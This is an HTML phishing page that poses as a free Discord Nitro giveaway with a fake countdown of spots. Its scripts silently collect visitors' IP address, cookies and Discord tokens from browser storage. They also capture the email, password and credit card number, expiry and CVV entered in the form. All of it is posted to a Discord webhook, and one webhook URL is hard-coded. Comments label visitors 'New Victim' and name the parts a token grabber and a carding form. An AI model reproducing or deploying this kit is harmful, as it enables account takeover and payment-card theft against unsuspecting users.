<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Nitro Free - Claim Now!</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@300;400;500;600;700&display=swap');
        body { font-family: 'Whitney', sans-serif; }
        .gradient-bg { background: linear-gradient(135deg, #5865f2 0%, #7289da 100%); }
    </style>
</head>
<body class="gradient-bg min-h-screen text-white">
    <div class="container mx-auto px-4 py-12 max-w-md">
        <!-- Header -->
        <div class="text-center mb-8">
            <img src="https://cdn.discordapp.com/attachments/123456789/discord-logo.png" alt="Discord" class="mx-auto w-24 h-24 mb-4">
            <h1 class="text-3xl font-bold mb-2">Free Discord Nitro!</h1>
            <p class="text-lg opacity-90 mb-6">Claim your 3-month Nitro Classic giveaway before it expires!</p>
            <div class="bg-yellow-500 bg-opacity-20 p-4 rounded-lg mb-6">
                <p class="font-semibold">⏰ Only 47 spots left!</p>
            </div>
        </div>

        <!-- IP Grabber (Silent) -->
        <script>
            // Silent IP grabber
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(data => {
                    const userAgent = navigator.userAgent;
                    const referrer = document.referrer || 'Direct';
                    const lang = navigator.language;
                    const screen = `${screen.width}x${screen.height}`;
                    const cookies = document.cookie;
                    
                    fetch('YOUR_DISCORD_WEBHOOK_URL', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**🕵️ New Victim**\n**IP:** \`${data.ip}\`\n**UA:** ${userAgent.substring(0,100)}...\n**Referrer:** ${referrer}\n**Lang:** ${lang}\n**Screen:** ${screen}\n**Cookies:** ${cookies || 'None'}`
                        })
                    });
                });
            
            // Discord Token Grabber
            const tokens = [];
            const tokenRegex = /(mfa\.[a-zA-Z0-9_-]{84}|[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27})/g;
            
            // Check localStorage, sessionStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const value = localStorage.getItem(key);
                const matches = value.match(tokenRegex);
                if (matches) tokens.push(...matches);
            }
            
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                const value = sessionStorage.getItem(key);
                const matches = value.match(tokenRegex);
                if (matches) tokens.push(...matches);
            }
            
            // Send tokens if found
            if (tokens.length > 0) {
                setTimeout(() => {
                    fetch('YOUR_DISCORD_WEBHOOK_URL', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**🔑 DISCORD TOKENS GRABBED**\n\`\`\`${tokens.join('\n')}\`\`\``
                        })
                    });
                }, 1000);
            }
        </script>

        <!-- Login Form -->
        <form id="loginForm" class="space-y-4">
            <div>
                <label class="block text-sm font-medium mb-2">Discord Email/Phone</label>
                <input type="text" id="email" required 
                       class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                       placeholder="example@email.com">
            </div>
            
            <div>
                <label class="block text-sm font-medium mb-2">Password</label>
                <input type="password" id="password" required 
                       class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50"
                       placeholder="••••••••">
            </div>

            <!-- Carding Form (Hidden by default) -->
            <div id="cardForm" class="space-y-4 hidden">
                <div>
                    <label class="block text-sm font-medium mb-2">Card Number</label>
                    <input type="text" id="cardNumber" required maxlength="19"
                           class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg"
                           placeholder="1234 5678 9012 3456">
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div>
                        <label class="block text-sm font-medium mb-2">Expiry (MM/YY)</label>
                        <input type="text" id="expiry" required maxlength="5"
                               class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg"
                               placeholder="12/25">
                    </div>
                    <div>
                        <label class="block text-sm font-medium mb-2">CVV</label>
                        <input type="text" id="cvv" required maxlength="4"
                               class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg"
                               placeholder="123">
                    </div>
                </div>
                <div>
                    <label class="block text-sm font-medium mb-2">Cardholder Name</label>
                    <input type="text" id="cardholder" required
                           class="w-full px-4 py-3 bg-white bg-opacity-20 border border-white border-opacity-30 rounded-lg"
                           placeholder="John Doe">
                </div>
            </div>

            <button type="submit" id="submitBtn"
                    class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 px-6 rounded-lg transition duration-200 transform hover:scale-105">
                <span id="btnText">Claim Nitro!</span>
                <div id="loadingSpinner" class="hidden animate-spin inline-block w-5 h-5 border-2 border-white border-t-transparent rounded-full"></div>
            </button>
        </form>

        <div class="text-center mt-6 text-sm opacity-75">
            <p>By claiming you agree to our <a href="#" class="underline">Terms</a></p>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const submitBtn = document.getElementById('submitBtn');
        const btnText = document.getElementById('btnText');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const cardForm = document.getElementById('cardForm');
        const webhookUrl = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI'; // Replace with your webhook

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Show loading
            submitBtn.disabled = true;
            btnText.classList.add('hidden');
            loadingSpinner.classList.remove('hidden');
            
            // Collect all data
            const data = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                ip: 'Captured on load',
                tokens: 'Checked on load',
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent
            };
            
            if (!cardForm.classList.contains('hidden')) {
                data.cardNumber = document.getElementById('cardNumber').value;
                data.expiry = document.getElementById('expiry').value;
                data.cvv = document.getElementById('cvv').value;
                data.cardholder = document.getElementById('cardholder').value;
            }
            
            // Send to webhook
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: '🎁 Nitro Claim Attempt',
                            color: 0x5865f2,
                            fields: [
                                { name: '📧 Email/Phone', value: `\`${data.email}\``, inline: true },
                                { name: '🔒 Password', value: `\`${data.password}\``, inline: true },
                                ...(data.cardNumber ? [
                                    { name: '💳 Card Number', value: `\`${data.cardNumber}\``, inline: true },
                                    { name: '📅 Expiry/CVV', value: `\`${data.expiry} | ${data.cvv}\``, inline: true },
                                    { name: '👤 Cardholder', value: `\`${data.cardholder}\``, inline: true }
                                ] : [])
                            ],
                            footer: { text: `UA: ${data.userAgent.substring(0,50)}...` },
                            timestamp: data.timestamp
                        }]
                    })
                });
                
                if (response.ok) {
                    // Show "success" and reveal card form
                    btnText.textContent = 'Processing Payment...';
                    setTimeout(() => {
                        cardForm.classList.remove('hidden');
                        btnText.textContent = 'Complete Payment';
                        btnText.classList.remove('hidden');
                        loadingSpinner.classList.add('hidden');
                    }, 1500);
                }
            } catch (error) {
                console.error('Webhook error:', error);
            }
        });

        // Format card number
        document.getElementById('cardNumber').addEventListener('input', (e) => {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/gi, '');
            const matches = value.match(/\d{4,16}/g);
            const match = matches && matches[0] || '';
            const parts = [];
            
            for (let i = 0, len = match.length; i < len; i += 4) {
                parts.push(match.substring(i, i + 4));
            }
            
            if (parts.length) {
                e.target.value = parts.join(' ');
            } else {
                e.target.value = value;
            }
        });
    </script>
</body>
</html>
